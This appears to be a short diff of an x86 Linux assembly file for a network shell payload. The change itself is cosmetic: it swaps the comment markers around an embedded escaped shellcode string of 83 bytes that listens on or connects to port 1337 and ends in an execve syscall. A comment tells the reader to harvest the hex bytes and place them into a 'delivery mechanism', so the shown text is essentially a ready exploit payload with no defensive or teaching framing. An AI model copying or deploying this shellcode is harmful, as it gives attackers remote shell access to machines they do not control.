@@ -7,7 +7,7 @@
 ; After building the binary, harvest the hex code to place
 ; into the delivery mechanism.
 
-/*
+%comment
 $port="\x05\x39";	#port 0x0539 = 1337 in decimal
 my $sc =
 "\x31\xdb\xf7\xe3\x53\x89\xe2\x6a\x10\x54\x52\x53\x89\xe1\xb3" . 
@@ -19,7 +19,7 @@ my $sc =
 "\x53\x89\xe1\x99\xb0\x0b\xcd\x80";
 # Shellcode Length: 83
 # cport = 1337
-*/
+%endcomment
 
 BITS 32
 SECTION .text 	; Section containing code
